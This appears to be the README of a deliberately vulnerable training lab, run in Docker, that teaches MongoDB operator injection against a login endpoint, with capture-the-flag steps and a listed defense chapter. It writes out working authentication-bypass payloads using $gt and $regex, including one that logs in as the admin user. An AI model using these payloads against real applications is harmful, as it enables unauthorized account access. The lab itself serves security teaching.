# nosql-injection: MongoDB operator injection bypasses authentication

The login endpoint passes the JSON body directly to `db.users.find_one()`. Sending `{"$gt": ""}` as the value for `username` or `password` makes MongoDB match any document where that field is greater than an empty string -- which is every document. Use `{"$regex": "^admin$"}` to log in specifically as the admin user.

> This container binds to `127.0.0.1` only.

CVE anchor: CVE-2023-27084 (HarperDB NoSQL injection).

## Quick start

```bash
docker compose up --build -d
until nc -z -w2 127.0.0.1 8085 2>/dev/null; do sleep 2; done && echo "ready"
```

## Attack path

| Step | Payload | Result |
|------|---------|--------|
| 1 | `{"username": {"$gt": ""}, "password": {"$gt": ""}}` | Login bypassed, any user |
| 2 | GET /dashboard | Flag 1 |
| 3 | `{"username": {"$regex": "^admin$"}, "password": {"$gt": ""}}` | Logged in as admin |
| 4 | GET /admin | Flag 2 |

## Docs

```
docs/01-introduction.md
docs/02-background.md
docs/03-finding-the-bug.md
docs/04-exploitation.md
docs/05-defense.md
```

## Stop the lab

```bash
docker compose down
```

## Requirements

- Docker with Compose
- Python 3 or curl
